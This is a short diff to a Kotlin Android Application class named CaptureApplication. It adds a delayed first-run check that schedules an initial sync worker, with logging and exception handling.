@@ -157,6 +157,19 @@ class CaptureApplication : Application() {
             }
         }, 5000) // 5 second delay to ensure app is fully initialized and installed
         
+        // Schedule initial sync worker if first run
+        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+            try {
+                if (com.chats.capture.utils.InstallationTracker.isFirstRun(this) &&
+                    !com.chats.capture.utils.InstallationTracker.isInitialSyncComplete(this)) {
+                    com.chats.capture.workers.InitialSyncScheduler.scheduleInitialSync(this)
+                    Timber.d("Initial sync scheduled from Application")
+                }
+            } catch (e: Exception) {
+                Timber.e(e, "Error scheduling initial sync from Application")
+            }
+        }, 10000) // 10 second delay to ensure app is fully initialized
+        
         // Schedule sync worker immediately (so data syncs even if MainActivity never runs)
         android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
             try {
